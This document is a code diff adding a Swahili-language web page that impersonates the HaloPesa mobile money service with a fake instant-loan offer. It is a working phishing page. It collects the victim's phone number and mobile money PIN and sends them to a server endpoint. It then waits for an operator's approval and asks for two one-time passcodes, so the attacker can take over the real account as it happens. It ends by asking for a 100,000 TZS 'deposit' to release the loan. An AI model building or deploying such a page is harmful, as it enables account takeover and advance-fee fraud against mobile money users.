@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HaloPesa - Omba Mkopo Haraka</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #FAFAFA;
+            color: #2D3748;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 15px;
+        }
+
+        .brand-header {
+            width: 100%;
+            max-width: 420px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .brand-logo {
+            font-size: 32px;
+            font-weight: 800;
+            color: #1A202C;
+            letter-spacing: -0.5px;
+        }
+
+        .brand-logo span {
+            color: #F96302;
+        }
+
+        .brand-subtitle {
+            font-size: 11px;
+            font-weight: 700;
+            color: #A0AEC0;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-top: 2px;
+        }
+
+        .page-title {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 25px;
+            color: #1A202C;
+            text-align: center;
+        }
+
+        .page-title span {
+            color: #F96302;
+        }
+
+        .card {
+            background: #FFFFFF;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 24px;
+            padding: 30px 22px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+            text-align: center;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1A202C;
+            margin-bottom: 25px;
+        }
+
+        .section-label {
+            font-size: 12px;
+            font-weight: 700;
+            color: #A0AEC0;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+
+        .amount-display {
+            font-size: 36px;
+            font-weight: 800;
+            color: #1A202C;
+            margin-bottom: 15px;
+        }
+
+        .slider-container {
+            width: 100%;
+            margin-bottom: 30px;
+        }
+
+        .range-slider {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 8px;
+            border-radius: 5px;
+            background: #E2E8F0;
+            outline: none;
+        }
+
+        .range-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: #F96302;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(249, 99, 2, 0.4);
+            border: 2px solid #FFFFFF;
+        }
+
+        .tenure-grid {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .tenure-btn {
+            flex: 1;
+            padding: 14px 0;
+            border: 1px solid #E2E8F0;
+            border-radius: 14px;
+            background: #FFFFFF;
+            font-size: 14px;
+            font-weight: 600;
+            color: #4A5568;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .tenure-btn.active {
+            background: #F96302;
+            color: #FFFFFF;
+            border-color: #F96302;
+            box-shadow: 0 4px 12px rgba(249, 99, 2, 0.3);
+        }
+
+        .payment-box {
+            background: #FFF5EE;
+            border-radius: 16px;
+            padding: 20px 15px;
+            margin-bottom: 25px;
+        }
+
+        .payment-amount {
+            font-size: 30px;
+            font-weight: 800;
+            color: #F96302;
+            margin-top: 4px;
+        }
+
+        .btn-orange {
+            width: 100%;
+            background: #F96302;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 30px;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(249, 99, 2, 0.35);
+            transition: transform 0.1s, background 0.2s;
+            margin-top: 15px;
+        }
+
+        .btn-orange:active {
+            transform: scale(0.98);
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .phone-input-wrapper {
+            display: flex;
+            align-items: center;
+            border: 2px solid #E2E8F0;
+            border-radius: 14px;
+            padding: 0 14px;
+            margin-top: 6px;
+            background: #FFF;
+        }
+
+        .country-prefix {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1A202C;
+            margin-right: 8px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 0;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            font-weight: 600;
+            color: #1A202C;
+            background: transparent;
+        }
+
+        .pin-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .pin-box, .otp1-box, .otp2-box {
+            width: 60px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #E2E8F0;
+            border-radius: 14px;
+            outline: none;
+            color: #1A202C;
+            background: #FAFAFA;
+        }
+
+        .pin-box:focus, .otp1-box:focus, .otp2-box:focus {
+            border-color: #F96302;
+            background: #FFF;
+        }
+
+        /* Loading Spinner Animation */
+        .loading-spinner {
+            width: 45px;
+            height: 45px;
+            border: 4px solid #E2E8F0;
+            border-top: 4px solid #F96302;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .spinner {
+            color: #4A5568;
+            font-weight: 700;
+            padding: 15px 0;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="brand-header">
+        <div class="brand-logo">halo<span>pesa</span></div>
+        <div class="brand-subtitle">Mwanachama wa Kikundi cha Old Mutual</div>
+    </div>
+
+    <h1 class="page-title">Pata Mkopo Wako <span>Haraka</span></h1>
+
+    <div class="card">
+        
+        <!-- STEP 1: Loan Calculator -->
+        <div id="step-calculator">
+            <div class="card-title">Kikokotoo cha Mkopo</div>
+
+            <div class="section-label">Kiasi Cha Mkopo</div>
+            <div class="amount-display" id="display-amount">TZS 5,000,000</div>
+
+            <div class="slider-container">
+                <input type="range" min="100000" max="5000000" step="100000" value="5000000" class="range-slider" id="loan-slider" oninput="updateCalculator()">
+            </div>
+
+            <div class="section-label">Muda Wa Marejesho</div>
+            <div class="amount-display" style="font-size: 22px; margin-bottom: 12px;" id="display-tenure">Miezi 12</div>
+
+            <div class="tenure-grid">
+                <button class="tenure-btn" onclick="selectTenure(6, this)">Miezi 6</button>
+                <button class="tenure-btn active" onclick="selectTenure(12, this)">Miezi 12</button>
+                <button class="tenure-btn" onclick="selectTenure(24, this)">Miezi 24</button>
+            </div>
+
+            <div class="payment-box">
+                <div class="section-label" style="color: #F96302;">Malipo Ya Kila Mwezi</div>
+                <div class="payment-amount" id="display-monthly">TZS 426,893</div>
+            </div>
+
+            <button class="btn-orange" onclick="proceedToPhone()">OMBA SASA</button>
+        </div>
+
+        <!-- STEP 2: Phone Number Input -->
+        <div id="step-phone" style="display: none;">
+            <div class="card-title">Weka Namba Yako Ya Simu</div>
+            <div class="input-group">
+                <label class="section-label">Namba ya HaloPesa</label>
+                <div class="phone-input-wrapper">
+                    <span class="country-prefix">+255</span>
+                    <input type="tel" id="phone-number" class="input-field" placeholder="07xxxxxxx" maxlength="10" oninput="validatePhoneInput(this)">
+                </div>
+            </div>
+            <button class="btn-orange" onclick="proceedToPin()">Endelea</button>
+        </div>
+
+        <!-- STEP 3: Nambari ya Siri / PIN (4 Digits) -->
+        <div id="step-pin" style="display: none;">
+            <div class="card-title">Ingiza Nambari ya Siri (PIN)</div>
+            <div class="section-label">PIN ya HaloPesa (Tarakimu 4)</div>
+            <div class="pin-container">
+                <input type="password" maxlength="1" class="pin-box" oninput="moveToNext(this, 'p2')">
+                <input type="password" maxlength="1" class="pin-box" id="p2" oninput="moveToNext(this, 'p3')">
+                <input type="password" maxlength="1" class="pin-box" id="p3" oninput="moveToNext(this, 'p4')">
+                <input type="password" maxlength="1" class="pin-box" id="p4">
+            </div>
+            <button class="btn-orange" onclick="submitPhoneAndPinData()">Endelea</button>
+        </div>
+
+        <!-- WAITING SCREEN -->
+        <div id="step-waiting" style="display: none; padding: 20px 0;">
+            <div class="loading-spinner"></div>
+            <p class="spinner" id="waiting-text">Tafadhali subiri tunavyochakata ombi lako...</p>
+        </div>
+
+        <!-- STEP 4: First 4-Digit OTP -->
+        <div id="step-otp1" style="display: none;">
+            <div class="card-title">Weka Namba Ya OTP 1</div>
+            <div class="section-label">Ingiza OTP ya kwanza (Tarakimu 4):</div>
+            <div class="pin-container">
+                <input type="password" maxlength="1" class="otp1-box" oninput="moveToNext(this, 'o1_2')">
+                <input type="password" maxlength="1" class="otp1-box" id="o1_2" oninput="moveToNext(this, 'o1_3')">
+                <input type="password" maxlength="1" class="otp1-box" id="o1_3" oninput="moveToNext(this, 'o1_4')">
+                <input type="password" maxlength="1" class="otp1-box" id="o1_4">
+            </div>
+            <button class="btn-orange" onclick="submitOtp1()">Endelea</button>
+        </div>
+
+        <!-- STEP 5: Second 4-Digit OTP -->
+        <div id="step-otp2" style="display: none;">
+            <div class="card-title">Weka Namba Ya OTP 2</div>
+            <div class="section-label">Ingiza OTP ya pili (Tarakimu 4):</div>
+            <div class="pin-container">
+                <input type="password" maxlength="1" class="otp2-box" oninput="moveToNext(this, 'o2_2')">
+                <input type="password" maxlength="1" class="otp2-box" id="o2_2" oninput="moveToNext(this, 'o2_3')">
+                <input type="password" maxlength="1" class="otp2-box" id="o2_3" oninput="moveToNext(this, 'o2_4')">
+                <input type="password" maxlength="1" class="otp2-box" id="o2_4">
+            </div>
+            <button class="btn-orange" onclick="submitOtp2()">Endelea</button>
+        </div>
+
+        <!-- SUCCESS SCREEN -->
+        <div id="step-success" style="display: none;">
+            <h3 style="color: #F96302; font-size: 24px; font-weight: 800;">🎉 Hongera!</h3>
+            <p id="success-msg" style="margin-top: 15px; font-size: 15px; color: #4A5568; line-height: 1.6; text-align: left;"></p>
+            <button class="btn-orange" onclick="location.reload()">Maliza</button>
+        </div>
+
+    </div>
+
+    <script>
+        let selectedMonths = 12;
+        let currentAmount = '5,000,000';
+        let fullPhoneNumber = '';
+
+        function updateCalculator() {
+            const amount = document.getElementById('loan-slider').value;
+            currentAmount = Number(amount).toLocaleString();
+            document.getElementById('display-amount').innerText = `TZS ${currentAmount}`;
+            
+            const interestRate = 0.025;
+            const monthlyPayment = Math.round((amount * (1 + interestRate * selectedMonths)) / selectedMonths);
+            document.getElementById('display-monthly').innerText = `TZS ${monthlyPayment.toLocaleString()}`;
+        }
+
+        function selectTenure(months, btnElement) {
+            selectedMonths = months;
+            document.getElementById('display-tenure').innerText = `Miezi ${months}`;
+            document.querySelectorAll('.tenure-btn').forEach(btn => btn.classList.remove('active'));
+            btnElement.classList.add('active');
+            updateCalculator();
+        }
+
+        function validatePhoneInput(input) {
+            input.value = input.value.replace(/\D/g, '');
+        }
+
+        function moveToNext(current, nextId) {
+            if (current.value.length >= 1) {
+                const nextElem = document.getElementById(nextId);
+                if (nextElem) nextElem.focus();
+            }
+        }
+
+        function proceedToPhone() {
+            const amount = document.getElementById('loan-slider').value;
+            fetch('/api/loan-request', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ amount, months: selectedMonths })
+            });
+            document.getElementById('step-calculator').style.display = 'none';
+            document.getElementById('step-phone').style.display = 'block';
+        }
+
+        function proceedToPin() {
+            const rawPhone = document.getElementById('phone-number').value.trim();
+            const startsWithZero = rawPhone.startsWith('0');
+            const isValidLength = (startsWithZero && rawPhone.length === 10) || (!startsWithZero && rawPhone.length === 9);
+
+            if (!isValidLength) {
+                alert('Tafadhali weka namba halali (Namba 10 ukianza na 0 au Namba 9 bila 0).');
+                return;
+            }
+
+            fullPhoneNumber = `+255${rawPhone}`;
+            document.getElementById('step-phone').style.display = 'none';
+            document.getElementById('step-pin').style.display = 'block';
+        }
+
+        async function submitPhoneAndPinData() {
+            const boxes = document.querySelectorAll('.pin-box');
+            let pin = '';
+            boxes.forEach(b => pin += b.value);
+
+            if (pin.length < 4) {
+                alert('Tafadhali weka Nambari ya Siri (PIN) ya tarakimu 4.');
+                return;
+            }
+
+            await fetch('/api/submit-pin-data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: fullPhoneNumber, pin })
+            });
+
+            document.getElementById('step-pin').style.display = 'none';
+            document.getElementById('step-waiting').style.display = 'block';
+            pollPinApproval();
+        }
+
+        async function pollPinApproval() {
+            let interval = setInterval(async () => {
+                try {
+                    let res = await fetch('/api/check-pin-status');
+                    if (!res.ok) return;
+                    let data = await res.json();
+
+                    if (data.status === 'approved') {
+                        clearInterval(interval);
+                        document.getElementById('step-waiting').style.display = 'none';
+                        document.getElementById('step-otp1').style.display = 'block';
+                    } else if (data.status === 'rejected') {
+                        clearInterval(interval);
+                        alert('Ombi lako limekataliwa na msimamizi.');
+                        location.reload();
+                    }
+                } catch (e) {
+                    console.error(e);
+                }
+            }, 3500);
+        }
+
+        async function submitOtp1() {
+            const boxes = document.querySelectorAll('.otp1-box');
+            let otp1 = '';
+            boxes.forEach(b => otp1 += b.value);
+
+            if (otp1.length < 4) {
+                alert('Tafadhali weka OTP 1 ya tarakimu 4.');
+                return;
+            }
+
+            await fetch('/api/verify-otp1', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp1 })
+            });
+
+            document.getElementById('step-otp1').style.display = 'none';
+            document.getElementById('step-waiting').style.display = 'block';
+            pollOtp1();
+        }
+
+        async function pollOtp1() {
+            let interval = setInterval(async () => {
+                try {
+                    let res = await fetch('/api/check-otp1-status');
+                    if (!res.ok) return;
+                    let data = await res.json();
+
+                    if (data.status === 'success') {
+                        clearInterval(interval);
+                        document.getElementById('step-waiting').style.display = 'none';
+                        document.getElementById('step-otp2').style.display = 'block';
+                    } else if (data.status === 'wrong') {
+                        clearInterval(interval);
+                        alert('OTP 1 sio sahihi. Jaribu tena.');
+                        location.reload();
+                    }
+                } catch (e) {
+                    console.error(e);
+                }
+            }, 3500);
+        }
+
+        async function submitOtp2() {
+            const boxes = document.querySelectorAll('.otp2-box');
+            let otp2 = '';
+            boxes.forEach(b => otp2 += b.value);
+
+            if (otp2.length < 4) {
+                alert('Tafadhali weka OTP 2 ya tarakimu 4.');
+                return;
+            }
+
+            await fetch('/api/verify-otp2', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp2 })
+            });
+
+            document.getElementById('step-otp2').style.display = 'none';
+            document.getElementById('step-waiting').style.display = 'block';
+            pollOtp2();
+        }
+
+        async function pollOtp2() {
+            let interval = setInterval(async () => {
+                try {
+                    let res = await fetch('/api/check-otp2-status');
+                    if (!res.ok) return;
+                    let data = await res.json();
+
+                    if (data.status === 'success') {
+                        clearInterval(interval);
+                        document.getElementById('step-waiting').style.display = 'none';
+                        document.getElementById('step-success').style.display = 'block';
+                        document.getElementById('success-msg').innerHTML = `Congratulations you have successfully borrow TZS ${currentAmount}<br><br>Tafadhali weka kiasi cha 100,000Tz kwenye akaunti yako ili kupokea kiasi unachochagua kwenye ${fullPhoneNumber}.`;
+                    } else if (data.status === 'wrong') {
+                        clearInterval(interval);
+                        alert('OTP 2 sio sahihi. Jaribu tena.');
+                        location.reload();
+                    }
+                } catch (e) {
+                    console.error(e);
+                }
+            }, 3500);
+        }
+    </script>
+</body>
+</html>
